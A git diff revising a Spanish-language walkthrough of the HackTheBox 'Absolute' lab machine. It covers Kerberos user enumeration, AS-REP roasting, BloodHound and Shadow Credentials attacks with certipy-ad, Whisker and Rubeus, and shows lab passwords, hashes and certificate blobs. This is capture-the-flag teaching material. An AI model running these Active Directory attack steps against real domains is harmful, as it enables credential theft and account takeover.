@@ -1,5 +1,5 @@
 ---
-title: "HackTheBox: Absolute"
+title: "HackTheBox: Absolute Write-Up en español"
 author: ace
 date: 2023-11-08 19:10 +0800
 categories:
@@ -35,9 +35,9 @@ image:
 
 ## Resumen
 
-Absolute es buana opción para aprender sobre Kerberos, ya que esta método de autenticación en AD desempeña un papel crucial en su resolución. A pesar de su inicial dificultad, especialmente si no estás familiarizado con Kerberos, la máquina se vuelve más abordable a medida que adquieres experiencia en esta área, al menos en su primera fase.
+Absolute es una máquina enfocada en Kerberos, ya que este método de autenticación en AD desempeña un papel crucial para su resolución. A pesar de su dificultad, especialmente si no estás familiarizado con Kerberos, la máquina se vuelve más sencilla a medida que adquieres aprendes a como usar Kerbrute, al menos en su primera fase.
 
-Absolute y la máquina Scrambled son de los mejores recursos para explorar los conceptos relacionados con Kerberos. La temática que vamos a tocar hoy es la siguiente:
+La temática que tocar esta máquina es la siguiente:
 
 - Enumeración de metadatos en imágenes.
 - Uso de **Username-Anarchy** para generar una wordlist que contenga posibles nombres de usuario
@@ -124,13 +124,107 @@ Host script results:
 
 ## Recon
 
-A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio. También por SMB y LDAP, se filtra el hostname y el FQDN de la máquina. Por lo cual yo aconsejo modificar el fichero `hosts` con la siguiente estructura:
+A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio. También por SMB y LDAP, se filtra el hostname de la máquina. En un entorno de AD, aconsejo modificar el fichero `hosts` con la siguiente estructura:
 
 ```bash
 10.129.142.54   dc.absolute.htb absolute.htb
 ```
-Es importante poner primero el FQDN para evitar problemas a futuro con Kerberos.
+Es importante poner primero el hostname para evitar problemas a futuro con Kerberos.
 
+### LDAP: 389, 3269
+
+En el resultado de nmap, vemos que LDAP, esta configurado con SSL. Si inpeccionamos el certificado podremos ver en el Common Name, `DC-CA`, esto quiere decir que existe una entidad certificadora en la máquina, de lo cual nos vamos a aprovechar más tarde para ganar acceso.
+
+```bash
+❯ openssl s_client -connect 10.129.142.54:3269 < /dev/null > /dev/null | openssl x509 -noout -text
+Cant use SSL_get_servername
+depth=0 CN = dc.absolute.htb
+verify error:num=20:unable to get local issuer certificate
+verify return:1
+depth=0 CN = dc.absolute.htb
+verify error:num=21:unable to verify the first certificate
+verify return:1
+depth=0 CN = dc.absolute.htb
+verify return:1
+DONE
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            6e:00:00:00:04:4c:07:8a:56:d2:51:0b:05:00:01:00:00:00:04
+        Signature Algorithm: sha1WithRSAEncryption
+        Issuer: DC = htb, DC = absolute, CN = absolute-DC-CA
+        Validity
+            Not Before: Jul 17 21:11:52 2023 GMT
+            Not After : Jul 16 21:11:52 2024 GMT
+        Subject: CN = dc.absolute.htb
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:c9:c3:5d:9d:39:dd:0f:1a:f3:93:54:b2:a9:47:
+                    04:d9:9f:fb:79:a5:54:fe:a3:f3:a0:dc:74:1c:e0:
+                    06:0c:05:e2:d9:36:70:b1:91:ed:59:fb:07:af:cc:
+                    6d:c4:ef:da:a6:dd:ac:12:f5:64:d9:51:0d:df:7f:
+                    61:1a:a6:d3:25:4d:f5:b8:a2:d2:81:c5:55:09:87:
+                    28:02:37:ab:a1:db:ff:1a:d2:7c:fb:8b:b3:3d:ab:
+                    f2:7c:ad:8a:38:3b:4c:e3:18:2e:df:30:23:39:e9:
+                    ef:24:e9:92:6e:21:d1:4b:73:04:27:aa:57:0e:03:
+                    a0:61:e2:e4:ed:3b:a3:11:7e:72:7a:80:16:48:09:
+                    64:6b:a4:ae:8f:f9:51:54:cc:da:86:f3:3c:28:d3:
+                    f2:1d:b7:6e:27:89:ac:cf:61:f2:da:e2:65:5e:75:
+                    85:5d:a1:2d:fb:fc:6e:88:1b:7f:6d:bf:82:f7:6a:
+                    f9:4b:11:a8:04:20:89:4a:7b:91:fb:d0:ad:ad:ef:
+                    3d:f7:0c:1a:32:53:82:c0:1f:d0:fe:94:51:6a:cc:
+                    91:40:f0:93:38:de:eb:08:f4:2f:7f:1d:b7:fe:d4:
+                    9f:36:03:7d:36:b2:6a:49:55:d2:bd:f1:2f:f6:16:
+                    fc:f7:4c:88:7d:92:00:9e:2a:7e:e6:0c:ca:a0:1a:
+                    1a:8d
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            1.3.6.1.4.1.311.20.2: 
+                . .D.o.m.a.i.n.C.o.n.t.r.o.l.l.e.r
+            X509v3 Extended Key Usage: 
+                TLS Web Client Authentication, TLS Web Server Authentication
+            X509v3 Key Usage: critical
+                Digital Signature, Key Encipherment
+            S/MIME Capabilities: 
+......0...`.H.e...*0...`.H.e...-0...`.H.e....0...`.H.e....0...+....0
+..*.H..
+            X509v3 Subject Key Identifier: 
+                21:EA:6B:5C:42:36:65:79:74:58:3B:EA:47:59:25:50:46:4A:02:61
+            X509v3 Authority Key Identifier: 
+                80:86:20:4F:E0:C3:6F:4A:F8:42:66:90:8B:3F:5F:50:3B:DD:A0:37
+            X509v3 CRL Distribution Points: 
+                Full Name:
+                  URI:ldap:///CN=absolute-DC-CA,CN=dc,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=absolute,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint
+            Authority Information Access: 
+                CA Issuers - URI:ldap:///CN=absolute-DC-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=absolute,DC=htb?cACertificate?base?objectClass=certificationAuthority
+            X509v3 Subject Alternative Name: 
+                othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
+            1.3.6.1.4.1.311.25.2: 
+                0@.>.
++.....7....0..S-1-5-21-4078382237-1492182817-2568127209-1000
+    Signature Algorithm: sha1WithRSAEncryption
+    Signature Value:
+        27:e4:9a:2b:e2:ef:d1:b0:ad:ad:18:90:38:7e:61:5f:a6:78:
+        25:95:b1:b1:08:a8:7e:8a:c4:64:02:1d:06:b3:b5:ed:30:ee:
+        8d:a1:2c:46:43:6d:34:89:9d:00:61:9c:7e:e3:36:9d:63:03:
+        54:bd:a3:ef:39:7a:50:b0:6c:00:9e:57:0f:38:e3:dc:a4:fb:
+        6a:0c:e2:90:92:cf:0e:8f:4c:22:e8:8d:c9:5f:72:10:78:69:
+        e9:f1:9e:63:3c:d3:63:df:f8:62:8b:82:81:9f:fa:95:b6:20:
+        d2:9e:e5:f4:5a:bd:46:5b:04:25:08:30:43:f7:18:2e:a9:58:
+        a8:80:ad:32:80:6e:d2:93:14:70:5a:8e:5d:75:78:c3:53:86:
+        cd:1d:77:8a:98:b2:e7:53:7a:9a:08:52:ab:67:3f:e1:6f:5f:
+        7e:df:25:79:0b:f2:95:d5:c3:00:5b:7b:d9:cb:1c:35:82:a2:
+        56:31:21:5d:17:8c:33:f8:12:e2:e7:13:99:c7:08:73:c9:76:
+        bd:8d:d8:e8:76:71:a5:47:66:61:14:58:9c:a5:0d:85:43:28:
+        09:1b:43:d1:d4:f2:22:33:2e:85:fe:e8:81:8a:da:69:67:84:
+        55:e3:02:91:a1:b6:5f:10:b1:25:19:1e:c5:71:32:0c:29:7b:
+        13:41:f1:a4
+
+```
+{: .nolineno }
 ### Web 80 - TCP
 
 Para ir directo al grano, no tenemos acceso a una sesión de invitado para enumerar recursos a través de SMB, no podemos conectarnos al DC mediante rpcclient, no podemos realizar querys por LDAP para enumerar usuarios o información del dominio, ni tampoco enumerar subdominios a través de ataques AXFR. En cuanto al servidor web, se trata de un IIS que almacena una página estática. Después de ejecutar Gobuster, no he encontrado nada de interés, como archivos PHP o ASPX. Sin embargo, podemos obtener información de las imágenes almacenadas en la carpeta '/images'. Descargaremos estas imágenes a nuestra máquina local para analizar posteriormente los metadatos.
@@ -142,7 +236,7 @@ wget -r http://absolute.htb/images
 
 #### ExifTool: Extrayendo metadatos
 
-Para analizar los metadatos de las imágenes, utilizaré ExifTool y filtraré por el campo 'Author' con el fin de obtener, si está disponible, el nombre de usuario que creó la imagen. En este caso, utilizaré un `*` para que el comando se aplique a todos los archivos PNG y me lo redirija a un fichero de texto. El comando que emplearé es el siguiente:
+Para analizar los metadatos de las imágenes, utilizaré ExifTool y filtraré por el campo 'Author' con el fin de obtener, si está disponible, el nombre de usuario que creó la imagen. En este caso, uso un `*` para que el comando se aplique a todos los archivos PNG y me lo redirija a un fichero de texto. El comando es el siguiente:
 
 ```bash
 ❯ exiftool *.jpg | grep -i "Author" | awk '{print $2}' FS=':' | sed 's/^ //g' | tee -a usernames.txt
@@ -198,10 +292,10 @@ sosvald
 
 ### User Enumeration: Kerbrute
 
-En Active Directory, el primer paso comúnmente realizado cuando se dispone de una lista de posibles usuarios del dominio es utilizar **Kerbrute** para comprobar si son válidos o no. Esto se  puede comprobar debido al funcionamiento de Kerberos. Cuando se envía una solicitud `AS_REQ` para obtener un TGT (Ticket Granting Ticket), si el usuario no es válido, Kerberos responde con un mensaje de `PRINCIPAL_UNKNOWN`, indicando que el usuario no se encuentra en la base de datos de Kerberos. Por otro lado, si el usuario es válido, Kerberos responderá con un mensaje de 'invalid credentials' u otra respuesta similar. 
+En Active Directory, el primer paso comúnmente realizado cuando se dispone de una lista de posibles usuarios del dominio es utilizar **Kerbrute** para comprobar si son válidos o no. Esto se puede comprobar debido al funcionamiento de Kerberos. Cuando se envía una solicitud `AS_REQ` para obtener un TGT (Ticket Granting Ticket), si el usuario no es válido, el KDC responde con un mensaje de `PRINCIPAL_UNKNOWN`, indicando que el usuario no se encuentra en la base de datos de Kerberos. Por otro lado, si el usuario es válido, Kerberos responderá con un mensaje de 'invalid credentials' u otra respuesta similar. De ahí viene el ataque `AS-REP Roast`, que vermos más adelante. 
 
 ```
-❯ /opt/kerbrute/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames.txt
+❯ /opt/kerbrute/kerbrute userenum -dc dc.absolute.htb -d absolute.htb usernames.txt
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -225,7 +319,7 @@ $krb5asrep$18$d.klay@ABSOLUTE.HTB:fc3b115409207e3dc0d7b4e5bcecb3e0$021ba373ad154
 2023/11/05 13:40:41 >  Done! Tested 24 usernames (6 valid) in 0.214 seconds
 ```
 
-Tras ejecutar Kerbrute, observamos un listado de usuarios válidos, y notamos que `d.klay` es vulnerable al ataque `AS-REP roast`. La última versión de Kerbrute realiza un AS-REP roast directamente para obtener el Ticket Granting Ticket (TGT) del usuario vulnerable. La vulnerabilidad de este usuario radica en su configuración, que tiene la opción `DONT_REQUIRE_PREAUTH` habilitada. Esto significa que no requiere autenticación previa de Kerberos, lo que permite que el `kdc` devuelva el TGT con la contraseña del usuario encriptada.
+Tras ejecutar Kerbrute, observamos un listado de usuarios válidos, y notamos que `d.klay` es vulnerable al ataque `AS-REP roast`. La última versión de Kerbrute realiza un AS-REP roast directamente para obtener el Ticket Granting Ticket (TGT) del usuario vulnerable. La vulnerabilidad de este usuario radica en su configuración, que tiene la opción `DONT_REQUIRE_PREAUTH` habilitada. Esto significa que no requiere autenticación previa de Kerberos, lo que permite que el `KDC` devuelva el TGT con la contraseña del usuario encriptada.
 
 Guardamos los usuarios válidos en un fichero.
 
@@ -241,7 +335,7 @@ d.klay
 {: .nolineno }
 ### AS-REP Roast Attack
 
-Por defecto, el valor ETYPE que Kerbrute muestra en su salida es el 18, mientras que el modo utilizado para crackear los hashes en Hashcat es el ETYPE 23. Debido a esta diferencia de formato, no será posible crackear el hash, ya que no coincide con el formato requerido por Hashcat. Para obtener el hash en un formato que hashcat entienda podemos hacer lo siguiente
+Por defecto, el valor ETYPE que Kerbrute muestra en su salida es el 18, mientras que el modo utilizado para crackear los hashes en Hashcat es el ETYPE 23. Debido a esta diferencia de formato, no será posible crackear el hash, ya que no coincide con el requerido por Hashcat. Para obtener el hash en un formato que hashcat entienda podemos hacer lo siguiente
 
 Usar `impacket-GetNPUsers`:
 
@@ -325,7 +419,7 @@ Para sincronizarlo podemos usar la herramienta `ntpdate`, aunque en mi caso tuve
 CLOCK: time stepped by 25200.798573
 ```
 {: .nolineno }
-Aunque ejecute este comando, el reloj no se síncroniza y esto en mi caso concreto se debía a que el demonio `systemd-timesyncd` estaba ejecutandose. Este demonio se utiliza para sincronizar el reloj del sistema a través de la red, lo cual causaba conficto con`ntpdate`. Para evitar errores simplemente deshabilito el servicio, y ya puedo sincronizarme al DC.
+Aunque ejecute este comando, el reloj no se síncroniza y esto en mi caso concreto se debía a que el demonio `systemd-timesyncd` estaba ejecutandose. Este demonio se utiliza para sincronizar el reloj del sistema a través de la red, lo cual causaba conficto con `ntpdate`. Para evitar errores simplemente deshabilito el servicio, y ya puedo sincronizarme al DC.
 
 ```bash
 ❯ systemctl stop systemd-timesyncd.service
@@ -530,12 +624,12 @@ SMB         10.129.229.59   445    DC               Shared
 SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 
 ```
 {: .nolineno }
-Vemos una carpeta llamada `Shared` , que de momento no podemos acceder, pero sería interesante apuntar para mirar más tarde.
+Vemos una carpeta llamada `Shared`, que de momento no podemos acceder, pero sería interesante apuntar para mirar más tarde.
 #### Bloodhound
 
 Blodhound es una herramienta que se usa para auditar Active Directory. Utiliza gráficos para mostrar cómo están relacionados los objetos dentro del dominio. Esto ayuda a comprender mejor el dominio y a planear posibles vectores de ataque para elevar privilegios o moverse lateralmente dentro del dominio.
 
-Normalmente se suele disponer de una shell en el sistema, y se lanzan los 'injestors' `SharpHound.exe` o `SharpHound.ps1`, para recopilar toda la información a través de consultasa LDAP en un fichero zip. Esto puede ser algo pesado de hacer ya que tienes que tener obligatoriamente una shell en alguno de los equipos del dominio y lo más probable es que tengas que evadir algún antivirus. En este caso en particular no queda otra que tirar `bloodhound-python` para enumerar el dominio. 
+Normalmente se suele disponer de una shell en el sistema, y se lanzan los 'injestors' `SharpHound.exe` o `SharpHound.ps1`, para recopilar toda la información a través de consultas LDAP que se guardan en ficheros json. Esto puede ser algo pesado de hacer ya que tienes que tener obligatoriamente una shell en alguno de los equipos del dominio y lo más probable es que tengas que evadir algún antivirus. En este caso en particular no queda otra que tirar `bloodhound-python` para enumerar el dominio. 
 
 Con el siguiente comando realizaremos todas esas consultas sin necesidad de subir ningún binario. La información recopilada estara comprendida en varios ficheros `json` que tendremos que subir a `bloodhound`.
 
@@ -645,7 +739,7 @@ SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763
 SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
 ```
 {: .nolineno }
-Anteriormente disponíamos de una carpeta compartida por SMB, a la cual no teníamos acceso, vamos a comprobar si ahora con el nuevo usuario comprometido podemos:
+Anteriormente disponíamos de una carpeta compartida por SMB, a la cual no teníamos acceso, vamos a comprobar si ahora con el nuevo usuario comprometido, podemos acceder:
 
 ### Enumerando SMB Autenticado
 
@@ -673,7 +767,7 @@ El output de crackmapexec nos indica que disponemos de permisos de lectura para 
 Password for svc_smb@ABSOLUTE.HTB: 
 ```
 
-No se porque por `smbclient` me daba fallos por todos lados usando kerberos. En estes caso use impacket. Es importante setear la variable de entorno `KRB55CNAME` al ticket anteriormente, ya que impacket por defecto busca el fichero `ccache` para usar Kerberos.
+No se porque por `smbclient` me daba fallos por todos lados usando Kerberos. En estes caso use impacket. Es importante setear la variable de entorno `KRB55CNAME` al ticket anteriormente, ya que impacket por defecto busca el fichero `ccache` para usar Kerberos.
 
 ```bash
 ❯ KRB5CCNAME=/tmp/krb5cc_1000 impacket-smbclient 'absolute.htb/svc_smb@dc.absolute.htb' -k
@@ -776,14 +870,13 @@ Habiendo transferido el binario a la máquina Windows, voy a ejecutarlo para ver
 
 ![img](/assets/img/post/Absolute/6.png)
 
-No veo ningún output ni ha ocurrido nada en especial cuando ejecuté el binario. Lo que voy a hacer, antes de hacerle reversing, es prender WireShark y voy a comprobar si cuando ejecute el binario existe tráfico saliente destinado a la dirección IP de Absolute. Ya que es común que esta clase de binarios customizados tengan que conectarse al DC, para realizar algún tipo de gestión pudiendo capturar credenciales en el proceso.
+No veo ningún output ni ha ocurrido nada en especial. Antes de hacer reversing, voy a prender WireShark y voy a comprobar si cuando ejecute el binario existe tráfico saliente destinado a la dirección IP de Absolute. Ya que es común que esta clase de binarios customizados tengan que conectarse al DC, para realizar algún tipo de gestión pudiendo capturar credenciales en el proceso.
 
-Cuando utilizamos Wireshark para capturar el tráfico en la interfaz `Ethernet0`, a menudo nos encontramos con una gran cantidad de datos que no son de interés.  Con el siguiente filtro vamos a capturar solamente los paquetes que contienen la dirección IP de Absolute y al mismo tiempo, quitamos las solicitudes DNS. El filtro que he utilizado es el siguiente
+Cuando utilizamos Wireshark para capturar el tráfico en la interfaz `Ethernet0`, a menudo nos encontramos con una gran cantidad de datos que no son de interés. Con el siguiente filtro vamos a capturar solamente los paquetes que contienen la dirección IP de Absolute y al mismo tiempo, quitamos las solicitudes DNS. El filtro que he utilizado es el siguiente
 
 ```
 ip.addr == 10.129.68.75 && not udp.port ==53
 ```
-
 
 ![img](/assets/img/post/Absolute/2.png)
 
@@ -791,7 +884,7 @@ Vamos a volver a ejecutar `test.exe`
 
 ![img](/assets/img/post/Absolute/3.png)
 
-En WireShark podemos ver el tráfico de red generado, en el que se encuentra las consultas LDAP.
+En WireShark podemos ver el tráfico de red generado, en el que se encuentran consultas LDAP.
 
 ![img](/assets/img/post/Absolute/4.png)
 
@@ -801,7 +894,7 @@ Si inspeccionamos los paquetes podemos ver las credenciales del usuario `m.loveg
 
 ## Acceso Inicial
 
-Voy a explicar dos métodos diferentes para obtener acceso. Uno desde Windows y otro desde Linux. En Windows, utilizaremos  `PowerView`, `Rubeus` y `Whisker`, lo que resulta en un proceso más sencillo. En el caso de Linux, tendremos que realizar pasos adicionales, como descargar un script de Impacket llamado `dacledit`, que no se encuentra en la rama por defecto, y luego utilizar la herramienta `certipy-ad`.
+Voy a explicar dos métodos diferentes para obtener acceso. Uno desde Windows y otro desde Linux. En Windows, utilizaremos  `PowerView`, `Rubeus` y `Whisker`, lo que resulta en un proceso más sencillo. En el caso de Linux, tendremos que realizar pasos adicionales, como descargar un script de Impacket llamado `dacledit`, que no se encuentra en la rama por defecto, y luego utilizar la `certipy-ad`.
 ### Enumerando el vector de ataque desde Bloodhound
 
 Primero vamos a comprobar que las credenciales capturadas por Wireshark sean válidas dentro del dominio.
@@ -822,7 +915,7 @@ El resultado de la query nos muestra un camino para convertirnos en el usuario `
 
 ![img](/assets/img/post/Absolute/24.png)
 
-Si vemos los grupos a los que pertenece `winrm_user`, vemos que es miembro de `Remote Management Users`, lo cual quiere decir que con las credenciales de este usuario podemos conectarnos mediante el servicio de la administación remota de Windows (WinRM) al DC.
+Si vemos los grupos a los que pertenece `winrm_user`, vemos que es miembro de `Remote Management Users`, que quiere decir, que con las credenciales de este usuario podemos conectarnos mediante el servicio de la administación remota de Windows (WinRM) al DC.
 
 ![img](/assets/img/post/Absolute/25.png)
 
@@ -840,7 +933,7 @@ Seguidamente vemos que los miembros de `Network Audit` poseen un `GenericWrite` 
 
 ![img](/assets/img/post/Absolute/29.png)
 
-Esto quiere decir que podemos escribir atribustos específicos del usuario `winrm_user` como miembros de este grupo, pudiendo crear SPNs, es decir hacer el usuario Kerberoesteable y luego con impacket o rubeus obtener el ticket del usuario con su contraseña cifrada. En este caso si nos vamos la pestaña `Linux Abuse` , vemos un ataque extra que es el **Shadow Credentials Attack**
+Podemos escribir atributos específicos del usuario `winrm_user` como miembros de este grupo, pudiendo crear SPNs, es decir hacer el usuario Kerberoesteable y luego con impacket o rubeus obtener el ticket del usuario con su contraseña cifrada, esto tendría sentido si la contraseña de **winrm_user** fuera débil, que no es el caso. En este caso si nos vamos la pestaña `Linux Abuse` , vemos un ataque extra que es el **Shadow Credentials Attack**
 
 ![img](/assets/img/post/Absolute/30.png)
 
@@ -849,7 +942,9 @@ Con este ataque es posible añadir Key Credentials al atributo `msDS-KeyCredenti
 Los requisitos para para que este ataque funcione son los siguientes:
 
 * El dominio debe tener AD CS configurado
-* El dominio debe tener un DC ejecutandose con WS 2016 que soporte PKINIT
+* El dominio debe tener un DC debe soportar PKINIT
+
+El primer requisito lo cumplimos ya que al principio lo hemos enumerado por LDAP
 
 El ataque explicado a detalle se puede encontrar aquí: [Shadow Credentials Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
 
@@ -1062,9 +1157,9 @@ Si vemos los miembros del grupo `Network Audit` vemos que `m.lovegod` se ha aña
 
 #### Desde Linux: Certipy-AD
 
-Este ataque se puede realiza usando `pyWhisker` o `certipy-ad`. En este caso lo voy a hacer con certipy, ya que el proceso es mucho más sencillo.
+Este ataque se puede hacer usando `pyWhisker` o `certipy-ad`. En este caso lo voy a hacer con certipy, ya que el proceso es mucho más sencillo.
 
-Con el siguiente comando automatizamos todo el proceso, obtiendo como resultado el hash del usuario `winrm_user` y el TGT, en formato ccache.
+Con el siguiente comando automatizamos todo el proceso, obtiendo como resultado el hash del usuario `winrm_user` y el TGT, en un fichero ccache.
 
 ```bash
 ❯ KRB5CCNAME=/tmp/krb5cc_1000 certipy-ad shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb
@@ -1088,7 +1183,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
 ```
 {: .nolineno }
-Como hemos visto antes, la autenticación NTLM está desactivada, por lo que el hash solo sirve para intentar crackearlo y obtener la contraseña en texto plano., cosa que no he conseguido. En este caso usamos el TGT `.ccache`, para conectarnos por WinRM al DC.
+Como hemos visto antes, la autenticación NTLM está desactivada, por lo que el hash solo sirve para intentar crackearlo y obtener la contraseña en texto plano, cosa que no he conseguido. En este caso usamos el TGT `.ccache`, para conectarnos por WinRM al DC.
 
 ```
 ❯ ls *.ccache
@@ -1131,11 +1226,11 @@ Ethernet adapter Ethernet0 3:
 
 #### Desde Windows: Whisker
 
-Bien este mismo ataque lo podemos hacer desde Windows con [Whisker](https://github.com/eladshamir/Whisker). Nos clonamos el repositorio y lo compilamos desde **Visual Studio Code**.
+Bien, este mismo ataque lo podemos hacer desde Windows con [Whisker](https://github.com/eladshamir/Whisker). Nos clonamos el repositorio y lo compilamos desde **Visual Studio Code**.
 
 ![img](/assets/img/post/Absolute/32.png)
 
-Antes de continuar. Existe una tarea programada en la máquina que hace, que cada ciertos minutos se borre la DACL, que anteriormente hemos modifcado. Por lo que nuestro usuario será eliminado del grupo `New Audit` y no podremos realizar este ataque con éxito. Así que cada cierto tiempo hay que volver a ejecutar los comandos anteriores para añadir el usuario al grupo mientras realizamos el ataque. Otra cosa importante es que cuando nosotros añadimos el usuario al grupo, el ticket, del que disponemos no guarda esa información o almenos es mi conclusión por que el ataque no funcionaba. Mi consejo es que regenereis el ticket una vez hayais añadido el usuario al grupo. Esto se hace de la siguente manera:
+Antes de continuar. Existe una tarea programada en la máquina que hace que cada ciertos minutos se borre la DACL, que anteriormente hemos modifcado. Por lo que nuestro usuario será eliminado del grupo `New Audit` y no podremos realizar este ataque con éxito. Así que cada cierto tiempo hay que volver a ejecutar los comandos anteriores para añadir el usuario al grupo mientras realizamos el ataque. Otra cosa importante es que cuando nosotros añadimos el usuario al grupo, el ticket, del que disponemos no guarda esa información o almenos es mi conclusión por que el ataque no funcionaba. Mi consejo es que regenereis el ticket una vez hayais añadido el usuario al grupo. Esto se hace de la siguente manera:
 
 ```
 klist purge
@@ -1152,7 +1247,7 @@ PS C:\Users\Alex> C:\tools\Whisker.exe add /domain:absolute.htb /target:winrm_us
 
 El output de **Whisker** nos dice que ejecutemos el siguiente comando con **Rubeus** para obtener el hash NTLM y TGT del usuario `winrm_user`. 
 
-Al comando que indica Whisker, le voy a añadir el parámetro `/ptt`, para inyectar el ticket en memoria. Obtenemos el hash NTLM del usuario sí, pero si recordamos bien, la autenticación esta configurada para que solamente funcione por Kerberos y un Pass-The-Hash no va a funcionar. Aun así podríamos intentar crackear el hash NTLM , y descubrir la contraseña, en este caso no pude romper el hash.  
+Al comando que indica Whisker, le voy a añadir el parámetro `/ptt`, para inyectar el ticket en memoria. 
 
 ```
 PS C:\Users\Alex> C:\tools\Rubeus.exe asktgt /user:winrm_user /certificate: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